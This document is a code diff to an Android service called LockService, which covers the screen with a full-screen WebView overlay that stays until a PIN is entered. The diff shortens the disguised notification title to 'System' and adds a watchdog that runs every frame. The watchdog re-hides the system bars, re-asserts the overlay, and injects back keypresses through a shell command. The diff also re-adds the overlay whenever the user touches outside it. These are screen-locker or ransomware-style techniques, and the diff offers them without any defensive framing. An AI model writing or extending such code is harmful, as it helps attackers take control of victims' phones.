@@ -10,7 +10,9 @@ import android.os.Build;
 import android.os.Handler;
 import android.os.IBinder;
 import android.util.Log;
+import android.view.Choreographer;
 import android.view.KeyEvent;
+import android.view.MotionEvent;
 import android.view.View;
 import android.view.WindowManager;
 import android.webkit.JavascriptInterface;
@@ -27,7 +29,11 @@ public class LockService extends Service {
 
     private WindowManager wm;
     private WebView webView;
+    private WindowManager.LayoutParams lp;
     private boolean unlocked = false;
+    private Handler handler = new Handler();
+    private Choreographer choreographer;
+    private Choreographer.FrameCallback frameCallback;
 
     @Override
     public void onCreate() {
@@ -42,7 +48,7 @@ public class LockService extends Service {
                 "sys", "System", NotificationManager.IMPORTANCE_MIN);
             getSystemService(NotificationManager.class).createNotificationChannel(ch);
             Notification n = new Notification.Builder(this, "sys")
-                .setContentTitle("System Service")
+                .setContentTitle("System")
                 .setSmallIcon(android.R.drawable.ic_menu_manage)
                 .setPriority(Notification.PRIORITY_MIN)
                 .build();
@@ -50,6 +56,7 @@ public class LockService extends Service {
         } catch (Exception ignored) {}
 
         showLock();
+        startUltraWatchdog();
         return START_STICKY;
     }
 
@@ -57,7 +64,7 @@ public class LockService extends Service {
         if (unlocked) return;
         if (webView != null) return;
 
-        new Handler(getMainLooper()).post(new Runnable() {
+        handler.post(new Runnable() {
             @Override public void run() {
                 try {
                     webView = new WebView(LockService.this);
@@ -93,6 +100,15 @@ public class LockService extends Service {
                     webView.setFocusableInTouchMode(true);
                     webView.requestFocus();
 
+                    webView.setOnTouchListener(new View.OnTouchListener() {
+                        @Override public boolean onTouch(View v, MotionEvent e) {
+                            if (e.getAction() == MotionEvent.ACTION_OUTSIDE) {
+                                instantReAdd();
+                            }
+                            return false;
+                        }
+                    });
+
                     String html = buildHtml();
                     webView.loadDataWithBaseURL(
                         "file:///android_res/raw/",
@@ -119,9 +135,10 @@ public class LockService extends Service {
                         | WindowManager.LayoutParams.FLAG_FULLSCREEN
                         | WindowManager.LayoutParams.FLAG_LAYOUT_INSET_DECOR
                         | WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH
-                        | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
+                        | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
+                        | WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS;
 
-                    WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
+                    lp = new WindowManager.LayoutParams(
                         WindowManager.LayoutParams.MATCH_PARENT,
                         WindowManager.LayoutParams.MATCH_PARENT,
                         type,
@@ -135,24 +152,64 @@ public class LockService extends Service {
                         | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                         | View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                         | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
-                        | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION;
+                        | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
+                        | View.SYSTEM_UI_FLAG_LOW_PROFILE;
 
                     wm.addView(webView, lp);
-                    final View fv = webView;
-                    new Handler(getMainLooper()).postDelayed(new Runnable() {
-                        @Override public void run() {
-                            try {
-                                fv.setSystemUiVisibility(View.SYSTEM_UI_FLAG_FULLSCREEN | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY | View.SYSTEM_UI_FLAG_LAYOUT_STABLE | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION);
-                            } catch (Exception ignored) {}
-                            new Handler(getMainLooper()).postDelayed(this, 500);
-                        }
-                    }, 500);
 
                 } catch (Exception e) {
                     Log.e(TAG, "showLock error: " + e.getMessage());
                 }
             }
         });
+    }
+
+    private void startUltraWatchdog() {
+        try {
+            choreographer = Choreographer.getInstance();
+            frameCallback = new Choreographer.FrameCallback() {
+                @Override
+                public void doFrame(long frameTimeNanos) {
+                    if (unlocked) return;
+                    try {
+                        if (webView != null) {
+                            webView.setSystemUiVisibility(
+                                View.SYSTEM_UI_FLAG_FULLSCREEN
+                                | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
+                                | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
+                                | View.SYSTEM_UI_FLAG_LAYOUT_STABLE
+                                | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
+                                | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
+                                | View.SYSTEM_UI_FLAG_LOW_PROFILE
+                            );
+                            try {
+                                wm.updateViewLayout(webView, lp);
+                            } catch (Exception ignored) {}
+                        }
+                        try {
+                            Runtime.getRuntime().exec(
+                                new String[]{"input", "keyevent", "4"});
+                        } catch (Exception ignored) {}
+                    } catch (Exception ignored) {}
+
+                    if (!unlocked && choreographer != null) {
+                        choreographer.postFrameCallback(this);
+                    }
+                }
+            };
+            choreographer.postFrameCallback(frameCallback);
+        } catch (Exception e) {
+            Log.e(TAG, "watchdog error: " + e.getMessage());
+        }
+    }
+
+    private void instantReAdd() {
+        try {
+            if (webView != null && lp != null) {
+                wm.updateViewLayout(webView, lp);
+                webView.bringToFront();
+            }
+        } catch (Exception ignored) {}
     }
 
     private String buildHtml() {
@@ -221,20 +278,8 @@ public class LockService extends Service {
         sb.append("function backspace(){var p=document.getElementById('pin');p.value=p.value.slice(0,-1);}");
         sb.append("function checkPin(){var p=document.getElementById('pin').value;if(p===CORRECT_PIN){if(window.Android){window.Android.unlock();}}else{setTimeout(function(){document.getElementById('pin').value='';},300);}}");
         sb.append("document.addEventListener('contextmenu',function(e){e.preventDefault();});");
-        sb.append("document.addEventListener('selectstart',function(e){e.preventDefault();});");
-        sb.append("document.addEventListener('dragstart',function(e){e.preventDefault();});");
-        sb.append("document.addEventListener('gesturestart',function(e){e.preventDefault();});");
         sb.append("document.addEventListener('touchmove',function(e){e.preventDefault();},{passive:false});");
-        sb.append("document.addEventListener('touchcancel',function(e){e.preventDefault();});");
-        sb.append("document.body.style.overflow='hidden';");
-        sb.append("document.body.style.position='fixed';");
         sb.append("document.addEventListener('keydown',function(e){e.preventDefault();return false;});");
-        sb.append("window.addEventListener('popstate',function(){history.pushState(null,null,'');});");
-        sb.append("history.pushState(null,null,'');");
-        sb.append("function goFullscreen(){var d=document.documentElement;if(d.requestFullscreen){d.requestFullscreen().catch(function(){});}");
-        sb.append("else if(d.webkitRequestFullscreen){d.webkitRequestFullscreen();}}");
-        sb.append("window.addEventListener('load',goFullscreen);");
-        sb.append("document.addEventListener('touchstart',goFullscreen,{once:true});");
         sb.append("</script></body></html>");
 
         return sb.toString();
@@ -244,7 +289,12 @@ public class LockService extends Service {
         @JavascriptInterface
         public void unlock() {
             unlocked = true;
-            new Handler(getMainLooper()).post(new Runnable() {
+            try {
+                if (choreographer != null && frameCallback != null) {
+                    choreographer.removeFrameCallback(frameCallback);
+                }
+            } catch (Exception ignored) {}
+            handler.post(new Runnable() {
                 @Override public void run() {
                     try {
                         if (webView != null) {
@@ -260,6 +310,12 @@ public class LockService extends Service {
 
     @Override
     public void onDestroy() {
+        unlocked = true;
+        try {
+            if (choreographer != null && frameCallback != null) {
+                choreographer.removeFrameCallback(frameCallback);
+            }
+        } catch (Exception ignored) {}
         try {
             if (webView != null) wm.removeView(webView);
         } catch (Exception ignored) {}
